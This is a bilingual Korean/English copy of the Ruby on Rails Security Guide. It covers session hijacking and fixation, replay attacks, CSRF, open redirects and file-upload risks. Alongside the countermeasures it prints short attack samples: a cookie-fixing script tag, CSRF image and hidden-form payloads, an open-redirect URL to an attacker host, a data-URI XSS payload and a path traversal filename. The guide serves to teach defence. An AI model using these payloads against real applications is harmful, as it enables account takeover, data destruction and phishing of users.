[Ruby on Rails Security Guide] 루비온레일스 보안 가이드
============================

이 매뉴얼은 웹어플리케이션에서 발생하는 일반적인 보안 문제를 설명하고 레일스로 이러한 문제를 해결하는 방법을 소개 합니다. [[[This manual describes common security problems in web applications and how to avoid them with Rails.]]]

이 가이드를 읽은 후에는 아래와 같은 내용을 알게 될 것입니다. [[[After reading this guide, you will know:]]]

* _중요한_ 대처방법 [[[All countermeasures _that are highlighted_.]]]

* 레일스에서의 세션 개념, 세션에 두어야 할 것들, 흔한 공격방법 [[[The concept of sessions in Rails, what to put in there and popular attack methods.]]]

* 특정 사이트를 방문하는 것만(CSRF)으로도 보안문제가 발생할 수 있는 이유 [[[How just visiting a site can be a security problem (with CSRF).]]]

* 파일 작업을 하거나 관리자 페이지를 제공할 때 주의해야 할 점 [[[What you have to pay attention to when working with files or providing an administration interface.]]]

* 사용자 관리방법(로그인/로그아웃)과 모든 레이어 상에서 메소드를 공격하는 방법 [[[How to manage users: Logging in and out and attack methods on all layers.]]]

* 가장 흔한 주입 공격 메소드 [[[And the most popular injection attack methods.]]]

--------------------------------------------------------------------------------

[Introduction] 개요
------------

웹어플리케이션 프레임워크는 개발자들의 웹어플리케이션 제작을 도와줍니다. 몇가지는 웹어플리케이션의 보안관련 사항도 지원해 줍니다. 실제로는 하나의 프레임워크가 다른 것 보다 보안상 더 안전하지는 것은 없습니다. 즉, 정확하게 사용한다면 몇가지 프레임워크를 함께 사용하여 보다 안전한 웹어플리케이션을 만들 수 있습니다. 루비온레일스는 예를 들어 SQL 주입에 대한 문제를 방지하기 위한 몇가지 영리한 헬퍼 메소드를 가지고 있어서 거의 문제가 되지 않습니다. 점검해 본 모든 레일스 어플리케이션이 양호한 보안상태를 보였다는 사실을 알게 되면 좋아할 것입니다. [[[Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem. It's nice to see that all of the Rails applications I audited had a good level of security.]]]

일반적으로, 그냥 사용하면 보안상태가 유지되는 것은 없습니다. 보안은 프레임워크를 어떻게 사용했는가에 좌우되고 때로는 개발 방법에 따라 달라질 수 있습니다. 그리고 웹어플리케이션 환경의 모든 레이어에서의 구현 방법에 좌우되는데, 백엔드 저장, 웹서버, 웹어플리케이션 자체, 그외에도 다른 레이어에서도 영향을 받을 수 있습니다. [[[In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server and the web application itself (and possibly other layers or applications).]]]

그러나, 가트너 그룹의 보고에 의하면 공격의 75%가 웹어플리케이션 레이어에서 이루어졌고 300개의 점검 웹사이트 중에서 97%가 공격에 취약한 것으로 밝혀 졌습니다. 이유는 웹어플리케이션은 비교적 공격하기가 쉽기 때문인데, 일반인들도 쉽게 이해하고 조작할 수 있기 때문인데 바로 이러한 점이 공격이 용이한 이유이기도 합니다. [[[The Gartner Group however estimates that 75% of attacks are at the web application layer, and found out "that out of 300 audited sites, 97% are vulnerable to attack". This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.]]]

웹어플리케이션에 대한 보안상의 문제점들로는, 사용자 계정 하이재킹, 접근통제의 우회술, 민간한 데이터를 읽거나 수정하기, 가짜 컨텐츠 보여주기 등이 있습니다. 또는 공격자는 Trojan 목마 프로그램이나 쓸모없는 이메일 발송 소프트웨어를 설치하거나, 재정확장을 목적으로 하거나 회사 자원을 변경하여 상품명에 손상을 입힐 수 있습니다. 이러한 공격을 막기 위해서는, 공격의 영향을 최소한으로 하고 공격 포인트를 제거하고, 무엇보다도 먼저, 정확한 대책을 찾기 위해서는 공격방법을 잘 이해해야만 합니다. 바로 이것이 본 가이드이 목적입니다. [[[The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.]]]

안전한 웹어플리케이션을 개발하기 위해서는, 모든 레이어에 대한 보안상의 최신 정보를 유지하고 적에 대해서 알아야 합니다. 최신 정보를 지속적으로 얻기 위해서는 보안관련 메일링 리스트를 구독하고 보안관련 블로그를 읽어 최신의 보안정보로 업데이트하고 보안상태를 점검하는 것을 습관으로 해야 합니다(<a href="#additional-resources">Additional Resources</a> 챕터를 보기 바랍니다). 저자의 경우 이러한 일이, 짜증나는 이론상의 보안 문제를 찾는 방법이기 때문에 직접 작업하고 있습니다. [[[In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). I do it manually because that's how you find the nasty logical security problems.]]]

[Sessions] 세션
--------

보안문제를 찾아 보는 시작점으로는 세션이 적당한데, 세션은 특정 공격에 취약할 수 있기 때문입니다. [[[A good place to start looking at security is with sessions, which can be vulnerable to particular attacks.]]]

### [What are Sessions?] 세션이란 무엇인가?

NOTE: _HTTP는 상태를 유지하지 못하는 stateless 프로토콜입니다. 그러나, 세션은 상태를 유지할 수 있게 해 줍니다._ [[[_HTTP is a stateless protocol. Sessions make it stateful._]]]

대부분의 어플리케이션은 사용자의 상태를 추적할 필요가 있습니다. 쇼핑 바스켓의 내용이나 현재 로그인한 사용자의 id가 이에 해당할 수 있습니다. 세션이라는 개념이 없다면 아마도 매 요청시마다 사용자를 확인해서 인증해야 할 것입니다. 레일스는 새로운 사용자가 해당 어플리케이션에 접근할 때 자동으로 새로운 세션을 만들게 됩니다. 사용자가 이미 해당 어플리케이션을 사용한 적이 있다면 이전의 세션 값을 로드할 것입니다. [[[Most applications need to keep track of certain state of a particular user. This could be the contents of a shopping basket or the user id of the currently logged in user. Without the idea of sessions, the user would have to identify, and probably authenticate, on every request. Rails will create a new session automatically if a new user accesses the application. It will load an existing session if the user has already used the application.]]]

하나의 세션은 대개 해시값들과 이 해시값에 대한 ID 값(32개의 문자열로 이루어진) 세션 id로 구성됩니다. 클라이언트 브라우져로 보내지는 모든 쿠키는 이 세션 id를 포함합니다. 그래서 클라이언트로부터 매 요청시마다 브라우저는 이 쿠키를 보내게 되는 것입니다. 레일스에서는 session 메소드를 이용하여 해당 값들을 저장하고 찾아볼 수 있습니다. [[[A session usually consists of a hash of values and a session id, usually a 32-character string, to identify the hash. Every cookie sent to the client's browser includes the session id. And the other way round: the browser will send it to the server on every request from the client. In Rails you can save and retrieve values using the session method:]]]

```ruby
session[:user_id] = @current_user.id
User.find(session[:user_id])
```

### [Session id] 세선 id

NOTE: _세션 id는 32 바이트 길이의 MD5 해시값을 가집니다._ [[[_The session id is a 32 byte long MD5 hash value._]]]

세션 id 는 무작위 문자열을 가지는 해시로 구성되어 있습니다. 이 무작위 문자열은, 현재 시간, 0 과 1 사이의 무작위 숫자, 루비 인터프리터의 프로세스 id 숫자(역시 기본적으로 무작위 숫자), 그리고 상수 문자열로 구성되어 있습니다. 현재로서는 레일스의 세선 id 값을 무차별 대입 공격으로 알아낼 수 없습니다. 아직까지 MD5가 건재하지만 의견 충돌이 있어 왔습니다. 그래서 이론적으로는 동일한 값을 가지는 input 텍스트를 만들 수 있습니다. 그러나, 아직까지는 보안상의 문제점을 일으킨 적이 없습니다. [[[A session id consists of the hash value of a random string. The random string is the current time, a random number between 0 and 1, the process id number of the Ruby interpreter (also basically a random number) and a constant string. Currently it is not feasible to brute-force Rails' session ids. To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same hash value. But this has had no security impact to date.]]]

### [Session Hijacking] 세션 하이재킹 (세션 가로채기)

WARNING: _공격자가 사용자의 세션 id를 가로채면 해당 사용자의 이름으로 웹어플리케이션을 사용할 수 있게 됩니다._ [[[_Stealing a user's session id lets an attacker use the web application in the victim's name._]]]

많은 수의 웹어플리케이션들이 인증시스템을 가지고 있어서, 사용자가 이름과 비밀번호를 제공하고 웹어플리케이션이 확인 후 해당 사용자의 id를 세션 해시에 저장하게 됩니다. 이 후로는 해당 세션이 유효하게 되는 것입니다. 매 요청시마다 어플리케이션은 새롭게 인증절차를 밟지 않고 세션 값 중의 사용자 id 를 확인하여 사용자를 로드하게 됩니다. 쿠키내의 세션 id는 세션을 확인하는데 사용합니다. [[[Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session id in the cookie identifies the session.]]]

따라서, 쿠키는 웹어플리케이션을 위한 임시 인증시스템으로서 역할을 하게 됩니다. 다른 사람의 쿠키 값을 이용하면 마치 해당 사람인 것처럼 어플리케이션을 사용할 수 있게 되어 심각한 결과를 초개할 수 있습니다. 아래에는 세션을 가로채는 몇가지 방법들을 소개합니다. [[[Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:]]]

* 보안상 안전하지 못한 네트워크. 무선 LAN이 이러한 네트워크의 예가 될 수 있습니다. 암호화되지 않는 무선 LAN에서는 특히 연결된 모든 클라이언트의 트래픽을 쉽게 들여다 볼 수 있습니다. 이런 문제가 커피 숍에서 작업을 하지 않게 되는 또 하나의 이유이기도 합니다. 웹어플리케이션 개발자들을 위해서는 _SSL로 안전하게 네트워크에 접속_할 수 있어야 합니다. 레일스 3.1부터는, 어플리케이션 config 파일에 항상 SSL로 강제 연결하도록 하여 이러한 문제를 해결할 수 있게 되었습니다. [[[* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. This is one more reason not to work from a coffee shop. For the web application builder this means to _provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:]]]

    ```ruby
    config.force_ssl = true
    ```

* 대부분의 사람들은 공중 컴퓨터 터미널에서 작업을 한 후에 쿠키를 제거하지 않습니다. 그래서 마지막 사용자가 웹어플리케이션으로부터 로그 아웃하지 않았다면, 다른 사람이 해당 사용자의 로그상태를 이용할 수 있게 되는 것입니다. 따라서 웹어플리케이션에서 사용자에게 _로그아웃 버튼_을 제고해 주고 눈에 확띄게 만들어 놓아야 합니다. [[[* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _log-out button_ in the web application, and _make it prominent_.]]]

* 많은 수의 XSS(cross-site scripting) 공격은 사용자의 쿠키를 얻는 것을 목적으로 합니다. 나중에 <a href="#cross-site-scripting-xss">XSS에 대한 자세한 내용</a>을 읽어 보기 바랍니다. [[[* Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. You'll read <a href="#cross-site-scripting-xss">more about XSS</a> later.]]]

* 공격자가 알지 못하는 쿠키를 훔치는 대신에, 공격자가 알고 있는 쿠키상의 사용자의 세션 id 값으로 바꿔 버리는 경우도 있습니다. 소위 세션 fixation 에 대해서 나중에 자세히 읽어 보기 바랍니다. [[[* Instead of stealing a cookie unknown to the attacker, he fixes a user's session identifier (in the cookie) known to him. Read more about this so-called session fixation later.]]]

대부분의 공격자들의 주 목적은 돈을 벌기 위함입니다. 
[[[The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10-$1000 (depending on the available amount of funds), $0.40-$20 for credit card numbers, $1-$8 for online auction site accounts and $4-$30 for email passwords, according to the [Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf).]]]

### [Session Guidelines] 세션 가이드라인

아래에 세션에 관련된 몇가지 일반적인 가이드라인이 있습니다. [[[Here are some general guidelines on sessions.]]]

* _하나의 세션이 용량이 큰 객체들을 저장하지 않는다_. 대신에 이 객체들을 데이터베이스에 저장하고 id 값을 세션에 저장해야 합니다. 이렇게 하므로써 동기화와 관련된 골치아픈 문제들을 제거하게 되고 어떤 세선 저장소를 선택하느냐에 따라 세션 저장 공간을 절약할 수 있게 될 것입니다. 또한 이것은 특정 객체의 구조를 변경할 경우 이전 버전의 객체가 다른 사용자의 쿠키에 여전히 존재할 경우에 대한 좋은 대안이 될 수 있습니다. 서버 측 세션 저장소를 사용할 경우에는 쉽게 세션들을 제거할 수 있지만, 클라이언트 측 저장소를 사용할 경우에는 세션 제거가 어렵게 됩니다. [[[_Do not store large objects in a session_. Instead you should store them in the database and save their id in the session. This will eliminate synchronization headaches and it won't fill up your session storage space (depending on what session storage you chose, see below). This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user's cookies. With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.]]]

* _Critical data should not be stored in session_. If the user clears his cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.

### Session Storage

NOTE: _Rails provides several storage mechanisms for the session hashes. The most important is `ActionDispatch::Session::CookieStore`._

Rails 2 introduced a new default session storage, CookieStore. CookieStore saves the session hash directly in a cookie on the client-side. The server retrieves the session hash from the cookie and eliminates the need for a session id. That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:

* Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. _Storing the current user's database id in a session is usually ok_.

* The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). So, of course, _you don't want to store any secrets here_. To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.

That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA1, for compatibility). So _don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_.

`config.secret_key_base` is used for specifying a key which allows sessions for the application to be verified against a known secure key to prevent tampering. Applications get `config.secret_key_base` initialized to a random key in `config/initializers/secret_token.rb`, e.g.:

    YourApp::Application.config.secret_key_base = '49d3f3de9ed86c74b94ad6bd0...'

Older versions of Rails use CookieStore, which uses `secret_token` instead of `secret_key_base` that is used by EncryptedCookieStore. Read the upgrade documentation for more information.

If you have received an application where the secret was exposed (e.g. an application whose source was shared), strongly consider changing the secret.

### Replay Attacks for CookieStore Sessions

TIP: _Another sort of attack you have to be aware of when using `CookieStore` is the replay attack._

It works like this:

* A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).
* The user buys something.
* His new, lower credit will be stored in the session.
* The dark side of the user forces him to take the cookie from the first step (which he copied) and replace the current cookie in the browser.
* The user has his credit back.

Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers (mongrels). Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).

The best _solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user_id in the session.

### Session Fixation

NOTE: _Apart from stealing a user's session id, the attacker may fix a session id known to him. This is called session fixation._

![Session fixation](images/session_fixation.png)

This attack focuses on fixing a user's session id known to the attacker, and forcing the user's browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:

* The attacker creates a valid session id: He loads the login page of the web application where he wants to fix the session, and takes the session id in the cookie from the response (see number 1 and 2 in the image).
* He possibly maintains the session. Expiring sessions, for example every 20 minutes, greatly reduces the time-frame for attack. Therefore he accesses the web application from time to time in order to keep the session alive.
* Now the attacker will force the user's browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Read more about XSS and injection later on.
* The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session id to the trap session id.
* As the new trap session is unused, the web application will require the user to authenticate.
* From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.

### Session Fixation - Countermeasures

TIP: _One line of code will protect you from session fixation._

The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:

```ruby
reset_session
```

If you use the popular RestfulAuthentication plugin for user management, add reset\_session to the SessionsController#create action. Note that this removes any value from the session, _you have to transfer them to the new session_.

Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.

### Session Expiry

NOTE: _Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (CSRF), session hijacking and session fixation._

One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _expire sessions in a database table_. Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.

```ruby
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end

    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end
```

The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a created_at column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:

```ruby
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
```

[Cross-Site Request Forgery (CSRF)] 사이트간 요청 위조(CSRF)
---------------------------------

이 공격방법은, 특정 사용자가 인증받은 바 있는 웹어플리케이션으로 연결되는, 특정 페이지에 악성 코드나 링크를 삽입하여 동작합니다. 해당 웹어플리케이션에 대한 세션이 유지된 상태라면, 공격자가 인증받지 못한 명령도 수행할 수 있게 될 것입니다. [[[This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.]]]

![](images/csrf.png)

<a href="#sessions">session 챕터</a>에서 대부분의 레일스 어플리케이션에서 쿠키를 이용한 세션을 이용한다는 것을 배웠습니다. 즉, 세션 id를 쿠키에 저장하여 서버측 세션 해시에 두거나, 전체 세션 해시를 클라이언트 측에 두게 됩니다. 어떤 경우에든, 해당 도메인에 대한 쿠키가 있을 경우, 매 요청시마다 브라우저는 자동으로 쿠키를 함께 도메인으로 보내게 됩니다. 다른 도메인으로부터의 요청이 있을 때에도 해당 쿠키를 보내게 되는지에 대해서는 논란의 여지가 있습니다. 아래의 예를 보도록 하겠습니다. [[[In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let's start with an example:]]]

* Bob 은 게시판에서 해커가 조작한 HTML image 엘리먼트가 포함되어 있는 임의의 게시물을 보게 됩니다. 이 이미지 엘리먼트는 이미지 파일이 아니라 Bob 의 프로젝트 관리 어플리케이션에 있는 특정 명령을 참조하도록 되어 있습니다. [[[Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file.]]]

* `<img src="http://www.webapp.com/project/1/destroy">`

* Bob 은 (몇분전에) 아직 로그아웃을 하지 않은 상태여서 www.webapp.com 에 대한 세션이 그대로 살아 있습니다. [[[Bob's session at www.webapp.com is still alive, because he didn't log out a few minutes ago.]]]

* Bob 이 해당 게시물을 보는 동작을 하게 될 때 브라우저는 이미지 태그를 찾게 됩니다. 그리고 www.webapp.com으로부터 (의심스러운) 해당 이미지를 로드하려고 시도하게 됩니다. 앞에서 설명한 바와 같이, 브라우저는 유효 세션 id가 들어 있는 쿠키와 함께 요청을 보내게 될 것입니다. [[[By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.]]]

* www.webapp.com 으로 연결되는 웹어플리케이션은 해당 세션 해시에 포함되어 있는 사용자 정보를 확인하게 되고 결국 1번 프로젝트를 삭제하게 됩니다. 그리고 나서 해당 브라우저에 대해서 기대치 못한 결과인 결과 페이지가 반환되고 결국 이미지를 표시되지 않게 될 것입니다. [[[The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.]]]

* Bob 은 공격상황을 인지하지 못하지만 몇일 후에 해당 번호의 프로젝트가 삭제된 것을 발견하게 됩니다. [[[Bob doesn't notice the attack - but a few days later he finds out that project number one is gone.]]]

실제로는 이러한 조작된 이미지나 링크가 반드시 웹어플리케이션의 도메인에 위치할 필요는 없다는 것을 아는 것이 중요합니다. 즉, 포럼, 블로그 또는 이메일에도 위치할 수도 있습니다. [[[It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere - in a forum, blog post or email.]]]

CSRF는 CVE (Common Vulnerabilities and Exposures) 에서 거의 보이지 않습니다. 2006년 경우 0.1% 미만에 불과했지만, 실제로는 '잠자는 거인'[Grossmann]의 형상을 하고 있는 것입니다. 이것은 나(그리고 다른 사람들)의 담보계약 업무에서의 결과와 현저한 대조를 이루는 것인데, _CSRF는 중요한 보안 문제입니다._ [[[CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in my (and others) security contract work - _CSRF is an important security issue_.]]]

### [CSRF Countermeasures] CSRF 대처법

NOTE: _가장 중요한 것은, W3C의 요구사항이기도 한데, 적절하게 GET과 POST를 사용하는 것입니다. 두번째로는, non-GET 요청에서 보안 토큰을 사용하면, 어플리케이션을 CSRF로부터 보호할 수 있을 것입니다._ [[[_First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF._]]]

HTTP 프로토콜은 기본적으로 GET과 POST 두개의 요청 형태(이것 외에도 더 있지만 대부분의 브라우저에서는 지원하지 않습니다)를 제공해 줍니다. World Wide Web Consortium (W3C) 에서는 HTTP GET 또는 POST 선택시 점검사항을 제공해 줍니다. [[[The HTTP protocol basically provides two main types of requests - GET and POST (and more, but they are not supported by most browsers). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:]]]

[**Use GET if:**] **GET을 사용할 경우**

* 상호작용이 _질의와 흡사_한 경우 (예를 들면, 쿼리, 읽기, 또는 검색)
[[[The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).]]]

[**Use POST if:**] **POST를 사용할 경우**

* 상호작용이 _주문과 흡사_한 경우, 또는 [[[The interaction is more _like an order_, or]]]

* 상호작용이 사용자가 인지할 수 있는 방식(예, 특정 서비스에 대한 구독)으로 리소스의 _상태를 변경_하는 경우, 또는 [[[The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or]]]

* 사용자가 상호작용의 _결과에 대해서 책임_을 지게 되는 경우 [[[The user is _held accountable for the results_ of the interaction.]]]

웹어플리케이션이 RESTful할 경우, PATCH, PUT, DELETE 와 같은 추가 HTTP 메소드에 익숙해져 있을 것입니다. 그러나, 오늘날 웹브라우저 대부분은 GET과 POST 외에는 지원하지 않습니다. 레일스는 이러한 문제점을 해결하기 위해서 hidden `_method` 속성을 사용합니다. [[[If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT or DELETE. Most of today's web browsers, however do not support them - only GET and POST. Rails uses a hidden `_method` field to handle this barrier.]]]

_POST 요청을 또한 자동으로 보낼 수 있습니다_. 아래에, 브라우저 상태바에 목적지로서 www.harmless.com 도메인을 표시해 주는 링크에 대한 예재 코드가 있습니다. 실제로, 이것은 동적으로 POST 요청을 보내게 되는 새로운 폼을 생성하게 됩니다. [[[_POST requests can be sent automatically, too_. Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. In fact it dynamically creates a new form that sends a POST request.]]]

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
```

또는 공격자는 특정 이미지의 onmouseover 이벤트 핸들러에 이 코드를 삽입해 두게 됩니다. [[[Or the attacker places the code into the onmouseover event handler of an image:]]]

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

백그라운드에서 공격하는 Ajax 를 포함해서 여러가지 다른 경우들도 있습니다. _이러한 것에 대한 해결책은 non-GET 요청시에 보안 토큰을 포함하는 것입니다_. 이러한 요청은 서버측에서 보안 토큰을 점검하게 됩니다. 레일스 2부터는 어플리케이션 컨트롤러에서 한줄로 해결하게 됩니다. [[[There are many other possibilities, including Ajax to attack the victim in the background. The _solution to this is including a security token in non-GET requests_ which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:]]]

```ruby
protect_from_forgery secret: "123456789012345678901234567890..."
```

이렇게 하면, 레일스에서 생성되는 모든 폼과 Ajax 요청에서, 현재 세션과 서버측 secret 로부터 산출되는 보안 토큰을 자동으로 포함게 될 것입니다. 세션 저장소로 CookieStorage 를 사용할 경우에는 서버측 secret 가 필요없습니다. 보안 토큰이 일치하지 않을 경우에는, 세션이 재설정될 것입니다. **주의:** 레일스 3.0.4 버전 이전에서는 이러한 상황에서 `ActionController::InvalidAuthenticityToken` 에러가 발생하게 됩니다. [[[This will automatically include a security token, calculated from the current session and the server-side secret, in all forms and Ajax requests generated by Rails. You won't need the secret, if you use CookieStorage as session storage. If the security token doesn't match what was expected, the session will be reset. **Note:** In Rails versions prior to 3.0.4, this raised an `ActionController::InvalidAuthenticityToken` error.]]]

예를 들어, `cookies.permament`와 같이 쿠키를 유지하는 상태로 사용자 정보를 저장하는 것이 일반적입니다. 이와 같은 경우에는, 쿠키가 제거되지 않게 되어 즉각적으로 CSRF 보호 효과가 사라지게 될 것입니다. 이러한 정보를 저장하기 위해 세션외에 다른 쿠키 저장을 사용할 경우에는 직접 조치사항을 작성해 주어야 합니다. [[[It is common to use persistent cookies to store user information, with `cookies.permanent` for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:]]]

```ruby
def handle_unverified_request
  super
  sign_out_user # Example method that will destroy the user cookies.
end
```

위의 메소드를 `ApplicationController`에 추가해 주면 non-GET 요청시에 CSRF 토큰이 없는 경우 자동으로 호출될 것입니다. [[[The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present on a non-GET request.]]]

_cross-site scripting (XSS) 에 취약할 경우에는 모든 CSRF 보호 효과가 사라지게 된다_는 것을 주의해야 합니다. XSS 는 공격자가 특정 페이지 상에 있는 모든 엘리먼트에 접근할 수 있게 주기 때문에, 공격자는 특정 폼으로부터 CSRF 보안 토큰을 읽을 수 있게 되거나 해당 폼에 대해서 직접 데이터를 서밋할 수 있게 됩니다. 나중에 <a href="#cross-site-scripting-xss">XSS</a> 에 대한 자세한 내용을 읽어 보기 바랍니다. [[[Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.]]]

Redirection and Files
---------------------

Another class of security vulnerabilities surrounds the use of redirection and files in web applications.

### Redirection

WARNING: _Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack._

Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:

```ruby
def legacy
  redirect_to(params.update(action:'main'))
end
```

This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by an attacker if he includes a host key in the URL:

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _And if you redirect to an URL, check it with a whitelist or a regular expression_.

#### Self-contained XSS

Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.

### File Uploads

NOTE: _Make sure file uploads don't overwrite important files, and process media files asynchronously._

Many web applications allow users to upload files. _File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers and other programs as a less privileged Unix user.

